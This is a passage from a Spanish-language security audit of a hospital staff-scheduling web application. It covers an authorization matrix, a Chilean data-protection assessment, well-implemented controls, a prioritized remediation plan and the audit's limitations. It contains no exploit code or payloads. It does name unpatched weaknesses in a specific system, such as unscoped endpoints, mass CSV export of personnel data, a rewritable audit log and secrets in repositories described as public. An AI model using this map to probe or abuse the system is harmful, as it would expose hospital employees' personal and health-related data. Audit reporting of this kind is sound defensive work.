| Puestos / Turnos / Reglas de servicio / Personal | Crear/Editar/Eliminar | `POST/PUT/DELETE /api/v2/{puestos,turnos,reglas-servicio,Personal}/**` | JEFATURA/SUBROGANTE/ADMIN | `SecurityConfig` (`SERVICE_ADMIN_PATHS`) | ❌ NO — rol correcto, servicio sin validar (H-06) |
| Funcionarios | Actualizar (`rol`, `estado`, `servicioId`) | `PUT /api/v2/funcionarios/{id}` | JEFATURA/ADMIN (self o superior) | Manual en controller | ❌ NO (C-01, Critical) |
| Funcionarios | Listar/Resumen por servicio | `GET /api/v2/funcionarios/summary` | Cualquiera autenticado | Solo `authenticated()` | ❌ NO — incluso sin `servicioId` devuelve todo el hospital (H-01) |
| Solicitudes | Aprobar/Rechazar | `PUT /api/v2/solicitudes/{id}/estado` | JEFATURA/SUBROGANTE/**MEDICO** | `SecurityConfig` | ❌ NO (H-07, C-02) |
| Ofertas generales | Aprobar/Rechazar/Seleccionar | `PUT /api/v2/ofertas-generales/{id}/**` | *(ninguno declarado)* | Solo `authenticated()` | ❌ NO (H-02) |
| Bitácora | Crear evento | `POST /api/v2/bitacoras` | *(ninguno declarado)* | Solo `authenticated()` | ❌ NO, además sobrescribible (H-03) |
| Exportaciones | Descargar CSV | `GET /api/v2/exportaciones/**` | *(ninguno declarado)* | Solo `authenticated()` | ❌ NO (H-01) |
| Notificaciones | Leer/Eliminar | `GET/DELETE /api/v2/notificaciones/**` | *(ninguno declarado)* | Solo `authenticated()` | ❌ NO (M-04) |
| Prácticamente todos los `GET` de Turnos/Puestos/Rotativas/Planificaciones/Servicios/Solicitudes | Leer | — | Cualquiera autenticado | Solo `authenticated()` | ❌ NO (M-05) |
| `/login`, `/login/select-service`, `GET /servicios` | — | — | Público | `permitAll` | N/A (correcto, necesario para el flujo de login) ✅ |
| `/health`, `/info` | — | — | Público | `permitAll` | N/A (correcto, healthcheck) ✅ |

**Conclusión de la matriz:** el sistema distingue correctamente **rol** (quién puede hacer qué tipo de operación) en los módulos de administración global, pero **no distingue alcance por servicio** en prácticamente ningún endpoint fuera de esos cuatro módulos globales. Es un patrón sistemático, no casos aislados — de ahí que la remediación estructural (propagar `servicioId` del JWT al `SecurityContext` + un componente de verificación de alcance reutilizable) sea más eficiente que parchear endpoint por endpoint.

---

## 7. Privacidad y protección de datos personales (Chile)

*(Evaluación técnica preparatoria; no reemplaza una revisión jurídica formal de la institución.)*

### 7.1 Qué datos personales trata el sistema

- **Identificación:** RUT completo + DV, nombre, apellidos (tablas `Funcionario`, vista `viewPersonal`, entidad `FuncionarioEntity`, `ViewPersonalEntity`).
- **Contacto:** teléfono, email profesional/personal (en `viewPersonal`, aunque el DTO expuesto al frontend hoy **no** incluye estos dos campos — verificado en `ViewPersonalSummaryDTO`, correcto por minimización).
- **Laborales:** profesión, estamento, cargo, tipo de contrato, servicio/unidad, jerarquía (rol de servicio), estado (activo/inactivo/etc.).
- **Operacionales:** turnos asignados, solicitudes (permiso, cobertura, intercambio) con motivo en texto libre, historial de aprobaciones/rechazos, bitácora de cambios.
- **Credenciales:** hash de contraseña (`clave`, en la BD del hospital, `@JsonIgnore` — nunca sale por API).

### 7.2 Dónde se almacenan / quién puede verlos

| Dato | Ubicación | Roles con acceso (hoy, real) |
|---|---|---|
| RUT + nombre completo | `Funcionario`, `viewPersonal`, exportaciones CSV, bitácora, notificaciones | **Cualquier usuario autenticado del sistema completo**, no solo su servicio (H-01, M-03) |
| Motivo de solicitudes (puede incluir datos de salud propios del solicitante, ej. licencias médicas) | `Solicitud.motivo`, bitácora | Igual que arriba — sin *scoping* |
| Hash de contraseña | `viewPersonal.clave` | Nadie vía API (`@JsonIgnore`) ✅ |
| RUT + nombre + credencial de ejemplo | Scripts SQL de despliegue versionados (M-08) | Cualquiera con acceso al repo Git (que hoy es público — C-00) |

### 7.3 Evaluación por principio

| Principio | Estado | Observación |
|---|---|---|
| **Finalidad** | ⚠️ Parcial | Los datos tratados corresponden al propósito declarado (gestión de turnos/personal), pero el *acceso* excede la finalidad al no respetar límites de servicio/unidad |
| **Proporcionalidad / Minimización** | ✅ Mayormente cumple | Los DTOs expuestos (`FuncionarioSummaryDTO`, `ViewPersonalSummaryDTO`) no sobre-exponen (no viajan teléfono/email en los endpoints revisados); la excepción es la sobreexposición *entre servicios*, no de *campos* |
| **Confidencialidad** | ❌ No cumple | Ver H-01, M-03, M-04, M-05 — cualquier autenticado accede a PII de todo el hospital, no solo su servicio |
| **Seguridad de los datos** | ❌ No cumple en el punto más grave | C-00 (secretos en repos públicos) es en sí mismo una falla de seguridad de datos con potencial de acceso no autorizado masivo |
| **Trazabilidad del acceso** | ⚠️ Parcial | Existe bitácora de cambios, pero (a) no registra *lecturas*, solo mutaciones, y (b) es reescribible (H-03) — no es una prueba de auditoría confiable en su estado actual |
| **Conservación / eliminación** | No evaluable en Fase 1 | No se detectaron políticas de retención ni purga automática en el código (`estado` es soft-delete, no hay TTL) — requiere definición de política institucional, no solo técnica |
| **Datos sensibles en logs** | ⚠️ Parcial | `console.log` del frontend vuelca RUT (L-04); logs del backend (`logger.info`) registran RUT en intentos de login (`[LOGIN] Request recibido. rut={}...`) — aceptable para trazabilidad de seguridad si los logs están protegidos, pero debe confirmarse rotación/acceso restringido a esos logs en Fase 2 |
| **Exportación masiva** | ❌ No cumple | H-01 permite exportar la nómina completa del hospital sin límite de volumen ni restricción de rol |
| **Acceso cruzado entre servicios/unidades** | ❌ No cumple | Es el hallazgo transversal de todo el informe |
| **Respuestas de API con más información de la necesaria** | ✅ Mayormente cumple | DTOs bien diseñados en cuanto a *campos*; el problema es de *alcance* (servicio), no de sobreexposición de campos individuales |

### 7.4 Relevancia normativa (marco de referencia, no asesoría legal)

- **Ley 19.628** (protección de la vida privada): el tratamiento de RUT, datos laborales y de salud (motivos de licencia en solicitudes) exige confidencialidad y finalidad — hoy comprometido por el acceso cruzado entre servicios.
- **Ley 21.719** (nueva ley de protección de datos personales, con autoridad de control): introduce exigencias de seguridad técnica y organizativa más estrictas y de reporte de incidentes — el hallazgo C-00 (secretos públicos) sería, bajo este marco, un incidente de seguridad de datos potencialmente reportable si se confirma que las credenciales expuestas dieron o pudieron dar acceso no autorizado a datos personales.
- **Ley 21.663** (marco de ciberseguridad): aplica especialmente si el hospital califica como operador de servicios esenciales — la ausencia de TLS, rate limiting y gestión de secretos alineada a buenas prácticas son brechas relevantes de cara a esa ley.
- Se recomienda que el hallazgo C-00 sea evaluado por el equipo legal/DPO de la institución como posible incidente a documentar internamente, independientemente de si se determina que hubo explotación real.

---

## 8. Lo que SÍ está bien implementado (para no sobre-reportar)

Vale la pena que quede documentado con el mismo nivel de detalle que los hallazgos negativos:

1. **Condiciones de carrera / concurrencia: resuelto de forma ejemplar.** Locking pesimista ordenado (evita deadlocks cruzados), relectura tras lock, revalidación de conflictos al momento de aprobar, bitácora diferida a `afterCommit`. Es la mejor parte del código base.
2. **Sin inyección SQL/JPQL en ningún punto** — 100% de las queries usan parámetros bindeados o métodos derivados de Spring Data.
3. **Sin superficie de carga de archivos** — no existe ningún endpoint de upload, elimina toda una clase de riesgo (path traversal, magic bytes, etc.).
4. **Gestión de secretos en el código actual (HEAD) es ejemplar:** sin valores por defecto para ningún secreto, `docker-compose.yml` usa `${VAR:?mensaje}` que aborta el arranque si falta una variable, `.gitignore` cubre los `.env` reales, `.env.dev` verificado como no trackeado.
5. **Autenticación bien endurecida:** BCrypt(12), mitigación de timing attack con hash señuelo (SEC-013), bloqueo de fuerza bruta (SEC-009, con limitación ya documentada), mensajes genéricos sin enumeración directa en el login, migración SHA-512→BCrypt con `DelegatingPasswordEncoder`.
6. **Flujo JWT de dos pasos correctamente aislado** (el token de pre-autorización no sirve para acceder a recursos protegidos) y `resolverAccesoServicio` sí valida membresía real al emitir el JWT final.
7. **Aislamiento de la base de datos externa del hospital:** solo lectura a nivel de datasource, entidad `@Immutable`, pool acotado — principio de mínimo privilegio bien aplicado a nivel de aplicación.
8. **Sin XSS explotable en el frontend** — cero primitivas de inyección de HTML, todo el contenido de API se renderiza como texto escapado por React.
9. **Manejo del token de pre-autorización:** nunca se persiste en storage, vive solo en memoria de React — el punto mejor resuelto de la capa de sesión del frontend.
10. **CORS, cabeceras de seguridad (HSTS, CSP, X-Frame-Options, Referrer-Policy) y `ServerTokens Prod`/`ServerSignature Off` correctamente configurados en Apache**, con documentación honesta en los propios comentarios de por qué se tomó cada decisión (incluyendo deuda reconocida, como HSTS pendiente de TLS).
11. **Backend Docker corre como usuario no-root**, multi-stage limpio (fuentes y Maven no llegan a la imagen final), `npm ci` en frontend para builds reproducibles.
12. **Dependencias de frontend actualizadas y sin CVEs aplicables** en las versiones realmente resueltas por el lockfile.
13. **Swagger deshabilitado por defecto y forzado a `false` en producción** en los tres backends del compose.
14. El propio código trae referencias a tickets `SEC-002`, `SEC-008`, `SEC-009`, `SEC-011`, `SEC-013` — evidencia de que **ya hubo una ronda previa de hardening dirigida**, con decisiones documentadas y trade-offs explicados. Este informe encuentra brechas adicionales, pero sobre una base que ya no partía de cero.

---

## 9. Plan de mitigación priorizado (Fase 1 — solo código/aplicación/Docker/Apache incluidos en el repo)

| Prioridad | Acción | Hallazgo(s) | Esfuerzo estimado |
|---|---|---|---|
| **0 — Hoy** | Rotar `JWT_SECRET` y contraseña de BD expuestas; decidir visibilidad de los 3 repos | C-00 | Bajo (rotación) / Medio (purga de historial) |
| **1** | Propagar `servicioId` del JWT al `SecurityContext` (`JwtAuthenticationFilter`) + crear `SeguridadServicio.exigirMismoServicio()` reutilizable | C-01, H-01, H-02, H-06, M-03, M-04, M-05 (cierra la mayoría de una vez) | Medio-Alto (cambio estructural, pero un solo patrón repetido) |
| **2** | Derivar identidad del actor desde `SecurityContext` en Solicitudes/Ofertas/Turnos; eliminar parámetros `idUsuarioAsignador`/`idReceptor`/`idFuncionario`/`idJefatura`/`idAdministrador` de los contratos | C-02, H-07 | Medio (toca varias firmas de endpoint) |
| **3** | Sanitizar prefijos de fórmula en `ExportacionService.valor()` | C-03 | Trivial (4 líneas) |
| **4** | Restringir `POST /bitacoras` a ADMINISTRADOR + invariante append-only | H-03 | Bajo |
| **5** | Excluir `rut` de campos auto-editables en `updateUser` | H-05 | Trivial |
| **6** | Rate limiting: mover `LoginAttemptService` a Redis + activar `mod_evasive`/`mod_qos` en Apache | H-04 | Medio (requiere infraestructura Redis) |
| **7** | Migrar `pom.xml` de `4.0.0-SNAPSHOT` a última GA 4.0.x; eliminar repos de snapshots | H-08 | Medio |
| **8** | Restringir `/server-status` y `/balancer-manager` a `Require local` | H-09 | Trivial |
| **9** | Configurar TLS en `apache-lb` (certificado gestionado en Fase 2, pero la config de Apache es Fase 1) | H-10 | Medio |
| **10** | Añadir `@Valid` + anotaciones Bean Validation a los DTOs realmente usados; manejar `MethodArgumentNotValidException` | M-01 | Medio (mecánico pero extenso) |
| **11** | Diferenciar `RuntimeException` genérica de excepciones de negocio en `GlobalExceptionHandler` | M-02 | Bajo-Medio |
| **12** | Eliminar `.env`/`.env production` del índice de Git (frontend); purgar credencial/PII de ejemplo de los scripts de `despliegue/` | M-07, M-08 | Trivial |
| **13** | Hardening de Docker Compose: `read_only`, `cap_drop: [ALL]`, `no-new-privileges`, límites de memoria/pids en los 7 servicios; `.dockerignore` en backend; fijar imágenes por digest; frontend Dockerfile con `USER`, `Options -Indexes`, `AllowOverride None` | M-14 a M-18 | Medio |
| **14** | Corregir `X-Forwarded-For` (usar `mod_remoteip`), `ServerAlias`, `mod_reqtimeout` | M-11, M-12, M-13 | Bajo |
| **15** | Limpieza de bajo riesgo: bug del doble `ROLE_`, `console.log` con RUT, `socket.js` muerto, archivos residuales, `GET /servicios` público | L-01 a L-09 | Trivial (agrupable en un solo PR de limpieza) |

**Nota metodológica:** las prioridades 1 y 2 no son "arreglar 15 endpoints por separado" — son **dos patrones estructurales** que, una vez corregidos en el punto central (filtro JWT + un componente de verificación de alcance, y la firma de los métodos de servicio que hoy aceptan un actor por parámetro), cierran la mayoría de los hallazgos Critical/High de una sola vez. Se recomienda abordarlos como refactor dirigido antes que como parches puntuales.

---

## 10. Requisitos documentados para Fase 2 (Infraestructura) — **solo documentación, sin cambios realizados**

Estos puntos son responsabilidad del equipo de Infraestructura y **no se tocó nada** relacionado con ellos en esta auditoría:

1. **TLS/certificados:** provisión y gestión del certificado real para `apache-lb` (la configuración de Apache que lo consume es Fase 1, ver punto 9 del plan; el certificado en sí y su renovación son Fase 2).
2. **Segmentación de red:** la red Docker (`10.55.0.0/16`) debe integrarse con la segmentación real del hospital (VLAN dedicada, firewall entre la DMZ del SGT y la red clínica/hospitalaria).
3. **Endurecimiento del host y SO** donde corre Docker: parches del kernel, Docker Engine actualizado, usuario de servicio sin privilegios para operar `docker compose`.
4. **SSH:** acceso administrativo al servidor (autenticación por clave, deshabilitar password auth, MFA, bastion host si aplica) — fuera del alcance de este repo.
5. **Firewall / WAF perimetral:** reglas de firewall de red (más allá del rate limiting de aplicación ya recomendado en Fase 1) y evaluación de un WAF gestionado delante de Apache.
6. **Monitoreo y alertas:** SIEM/observabilidad para detectar los patrones de abuso identificados en este informe (ej. múltiples `GET /funcionarios/summary` con distintos `servicioId` desde una misma cuenta, ráfagas de `POST /bitacoras`, intentos de login distribuidos).
7. **Respaldos:** política de backup de `gestionturnos` (la BD `innhosp`/hospital es responsabilidad del hospital, ya que el SGT solo la lee) — frecuencia, cifrado en reposo, prueba de restauración.
8. **Verificación del usuario de BD externa a nivel de motor MySQL:** confirmar con el DBA del hospital que el usuario configurado en `HOSPITAL_DB_USERNAME` tiene efectivamente **solo `GRANT SELECT` sobre `viewPersonal`** (o las tablas mínimas necesarias) a nivel del motor MySQL — el código de aplicación ya asume y refuerza esto (`hikari.read-only=true`), pero la garantía real vive en la configuración de permisos de MySQL, fuera de este repositorio.
9. **DNS y publicación en Internet:** registro del dominio público, configuración DNS, y confirmación de que el puerto 5173 (actualmente usado porque "el 80 está bloqueado por el router", según comentario en `docker-compose.yml`) se resuelve correctamente para el público objetivo o se reemplaza por 443 estándar en producción.
10. **Gestión de secretos en producción:** considerar un gestor de secretos (Vault, AWS/Azure Secrets Manager, o como mínimo un `.env` con permisos de archivo restringidos y fuera del working directory versionado) en lugar de variables de entorno planas en el host — complementa, no reemplaza, la corrección de C-00.
11. **MFA para roles ADMINISTRADOR/JEFATURA:** decisión institucional sobre si se implementa a nivel de aplicación (Fase 1, pendiente de decisión de producto) o se delega a un IdP externo (Fase 2).

---

## 11. Limitaciones del análisis

- No se ejecutó la aplicación (no hay entorno de pruebas activo en este ejercicio); todos los hallazgos son de **revisión estática de código** con trazabilidad archivo:línea, no de explotación confirmada en runtime. Se recomienda verificación dinámica (DAST) antes de publicar en Internet.
- No se verificó el usuario de MySQL de la BD externa del hospital a nivel de motor de base de datos (permisos `GRANT`) — eso vive fuera del repositorio de código y queda como requisito explícito de Fase 2 (sección 10, punto 8).
- El skill `/security-engineer` no estaba instalado como comando; se usó el archivo `engineering-security.md` como marco metodológico manual, según lo indicado en el propio encargo ante esta situación.
- La matriz de la sección 6 es un extracto priorizado; existe una matriz completa endpoint-por-endpoint (generada durante la auditoría) disponible si se necesita el detalle exhaustivo de los ~90 endpoints.
- Los CVSS indicados son estimaciones cualitativas del equipo auditor (no calculados con la calculadora oficial FIRST), pensadas para priorización relativa, no como puntaje certificado.
- No se probó exhaustivamente el frontend en un navegador real (ver limitación estándar: type-checking/revisión estática verifica corrección de código, no corrección funcional en UI real) — los hallazgos de frontend son de revisión de código fuente.
